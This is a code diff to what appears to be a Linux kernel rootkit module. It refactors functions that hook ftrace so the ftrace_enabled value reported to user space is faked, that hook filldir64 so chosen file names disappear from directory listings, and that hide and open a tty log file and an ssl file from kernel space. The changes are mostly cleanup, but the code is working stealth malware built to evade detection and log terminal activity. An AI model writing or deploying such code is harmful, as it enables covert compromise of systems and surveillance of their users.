@@ -244,6 +244,7 @@ static bool _ftrace_intercept(struct pt_regs *regs) {
                 _ftrace_intercept_init(false)) {
             char current_value[16+1] = {0};
             char output[] = "1\n";
+            size_t output_size;
 
             arg = (const char __user *)PT_REGS_PARM2(regs);
             if (copy_from_user(current_value, (void *)arg, 16))
@@ -251,7 +252,7 @@ static bool _ftrace_intercept(struct pt_regs *regs) {
 
             current_value[sizeof(current_value) - 1] = '\0';
             strncpy(output, kv_prev_ftrace_enabled, sizeof(output));
-            size_t output_size = sizeof(output) - 1;
+            output_size = sizeof(output) - 1;
 
             if (!copy_to_user((void*)arg, output, output_size))
                 rc = true;
@@ -747,6 +748,7 @@ static int  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u
 static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
 #endif
 
+    //XXX: d_type == DT_DIR ? "Directory" : "Reg file"
     if (fs_search_name(name, ino))
         return 0;
     return real_filldir64(ctx, name, namlen, offset, ino, d_type);
@@ -1281,22 +1283,26 @@ bool sys_init(void) {
     if (_sys_file_init(64, 64)) {
         char *tty = strrchr(sys_get_ttyfile(), '.');
         char *ssl = strrchr(sys_get_sslfile(), '.');
-        const char *files_to_hide[] = {tty, ssl, NULL};
+
+        if (!tty || !ssl) {
+            prerr("sys_init: Invalid parameter\n");
+            return rc;
+        }
 
         /** init fist a couple of hidden files */
-        if (tty && ssl && fs_add_name_ro(files_to_hide, 0) == 0) {
+        fs_add_name_ro(tty, 0);
+        fs_add_name_ro(ssl, 0);
 
-            rc = !fh_install_hooks(ft_hooks);
-            if (rc) {
-                for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
-                    prinfo("ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
+        rc = !fh_install_hooks(ft_hooks);
+        if (rc) {
+            for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
+                prinfo("sys_init: ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
 
-                /** Init tty log */
-                ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
-                if (!ttyfilp) {
-                    prerr("Failed loading tty file\n");
-                    rc = false;
-                }
+            /** Init tty log */
+            ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
+            if (!ttyfilp) {
+                prerr("sys_init: Failed loading tty file\n");
+                rc = false;
             }
         }
     }
